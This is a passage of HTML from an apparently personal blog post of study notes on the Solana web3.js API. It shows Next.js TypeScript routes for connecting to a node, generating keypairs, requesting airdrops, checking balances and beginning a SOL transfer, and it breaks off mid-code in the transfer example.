56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACh0lEQVQoz2WR3UuTcRTHz7Pn2UvMbc69OB+1kTnNNR1WtlZmNRMzMcllmk2XMxZlUVK6sldCeoOIUAShF8sICYLoMrDLrqKLbgv6N7r7xPNMLeji/M45v9/5fTjfc0TRyhHR0APN7PcN0+4fJKH30V6eoSuUpTOUocl7EK9tI5WuOI2xXipCMco31FO5o5Vw8gCauBDFjqIFEYs1hIiD2tYeTo0vM5F4z1T8A/mGl2Rr55lu+MhEdJFqbwvJLaP0bX1AdNMhEp4MHmcEa0kFonhQVC+iBhGzQ0sA1VlFPD9Oz4150oXnDFxYZKR3ice7f3Et9omWyDA3b3zj/p2f7Kod4Xj1IxQtgCg+DIaiBk0Tg2pClQAibsQaQDx+ssfeMJleIRtdZCr+hYG6p6QLCzz58ZujyRk6gpcR1YNFqyj+N6AmxzgMqDWExaGj2nVzBF25e0y//k6ue4nrO78SLknh0mNkP68wMLaA19KIWH1oNh1zbGuN/Q3KEHGhiB9R/Ijmp+VCgT2pSexSi4gTER+iBJENlYiUFOuMhYiXtcZkDeaq2oF/6CS2VBKrXWfb9nYCvgj10QR10QQl7hrszmpiTW1sDDejVzfhKq2hMb6PqnDchBclm1t2E6kbovXuW9zDgwQD9czNv6AwPcPZ8QK3bj9kcChPLN7G4qtlZuee8fDRrHlv5FNX767LFosWQhQ3dd4jnNj7jkhqHLurivyZK4ycOk9m5Bzp/hy505foOzZKcs9henozdHT2Mzp2kQPtR9nd2o3Vof8jWQ1is4Vx2DejqsZDYHU+nlVfVrT1mXkQKV317mL831IMiGoso5gbZshY8xZr8U61VazmRVNtofU6o8M/13ROJi18q2AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"sol.png\"\n        title=\"sol.png\"\n        src=\"/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png\"\n        srcset=\"/static/42c50aa129dde452dfcc4a7375ec7765/e9ff0/sol.png 180w,\n/static/42c50aa129dde452dfcc4a7375ec7765/f21e7/sol.png 360w,\n/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png 720w,\n/static/42c50aa129dde452dfcc4a7375ec7765/302a4/sol.png 1080w,\n/static/42c50aa129dde452dfcc4a7375ec7765/07a9c/sol.png 1440w,\n/static/42c50aa129dde452dfcc4a7375ec7765/29114/sol.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"solana-analysis-program--web3-api\" style=\"position:relative;\"><a href=\"#solana-analysis-program--web3-api\" aria-label=\"solana analysis program  web3 api permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solana analysis: Program &#x26;&#x26; Web3 API</h1>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>Connection<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>network<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> version <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">getVersion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">[</span><span class=\"token string\">'solana-core'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>3party JSON RPC connections (web3 provider)\n<ul>\n<li>→ netowkr object instance to getNodeURL ⇒ url parser</li>\n</ul>\n</li>\n<li>@figment-solana/lib\n<ul>\n<li>→ Connection input url  ← solana-core</li>\n</ul>\n</li>\n<li>@solana/web3.js</li>\n</ul>\n<h2 id=\"generate-key-pair\" style=\"position:relative;\"><a href=\"#generate-key-pair\" aria-label=\"generate key pair permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>generate key pair</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>Keypair<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">ResponseT</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  secret<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">;</span>\n  address<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">function</span> <span class=\"token function\">keypair</span><span class=\"token punctuation\">(</span>\n  _req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span> <span class=\"token operator\">|</span> ResponseT<span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> keypair <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Keypair</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> keypair<span class=\"token punctuation\">.</span>publicKey<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> secret <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">Array</span><span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>keypair<span class=\"token punctuation\">.</span>secretKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      secret<span class=\"token punctuation\">,</span>\n      address<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<ul>\n<li>Ed25519 Crypto Alg use</li>\n<li>pubKey, PrivKey</li>\n</ul>\n<h2 id=\"sol-balance-mainnet-testnet\" style=\"position:relative;\"><a href=\"#sol-balance-mainnet-testnet\" aria-label=\"sol balance mainnet testnet permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SOL balance (mainnet, testnet)</h2>\n<ul>\n<li>network provider name ⇒ token name diffirent</li>\n</ul>\n<h2 id=\"air-drop\" style=\"position:relative;\"><a href=\"#air-drop\" aria-label=\"air drop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Air Drop</h2>\n<ul>\n<li>Account Provider to Balance ⇒ Air drop</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">1 SOL = 1,000,000,000 lamports</code></pre></div>\n<ul>\n<li>Arid Drop reques</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>Connection<span class=\"token punctuation\">,</span> PublicKey<span class=\"token punctuation\">,</span> <span class=\"token constant\">LAMPORTS_PER_SOL</span><span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">fund</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>network<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">'confirmed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> publicKey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">requestAirdrop</span><span class=\"token punctuation\">(</span>publicKey<span class=\"token punctuation\">,</span> <span class=\"token constant\">LAMPORTS_PER_SOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">confirmTransaction</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>PublicKey(secretkey) ⇒ pub key generate</li>\n<li>Connection.requestAirdrop(pubkey, LAMPORTS_PER_SOL)</li>\n<li>LAMPORTS_PER_SOL is 1 SOL == 1,000,000,000</li>\n<li>and… confirmTransaction await timming</li>\n</ul>\n<h2 id=\"user-balance-check\" style=\"position:relative;\"><a href=\"#user-balance-check\" aria-label=\"user balance check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>User Balance Check</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>Connection<span class=\"token punctuation\">,</span> PublicKey<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">balance</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span> <span class=\"token operator\">|</span> <span class=\"token builtin\">number</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>network<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">'confirmed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> publicKey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> balance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>publicKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>balance <span class=\"token operator\">===</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> balance <span class=\"token operator\">===</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Account not funded'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>account address ⇒ publickey</li>\n<li>getBaalnce(pub key) check</li>\n</ul>\n<h2 id=\"sol-transfer\" style=\"position:relative;\"><a href=\"#sol-transfer\" aria-label=\"sol transfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SOL Transfer</h2>\n<ul>\n<li>Balance ⇒ Other Sigined Account (Cluster)</li>\n<li>Transaction Cluster, Solana Runtime</li>\n<li>lamport ? 0 check</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>\n  Connection<span class=\"token punctuation\">,</span>\n  PublicKey<span class=\"token punctuation\">,</span>\n  SystemProgram<span class=\"token punctuation\">,</span>\n  Transaction<span class=\"token punctuation\">,</span>\n  sendAndConfirmTransaction<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>address<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> recipient<span class=\"token punctuation\">,</span> lamports<span class=\"token punctuation\">,</span> network<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">'confirmed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> fromPubkey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> toPubkey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>recipient<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> secretKey <span class=\"token operator\">=</span> Uint8Array<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span 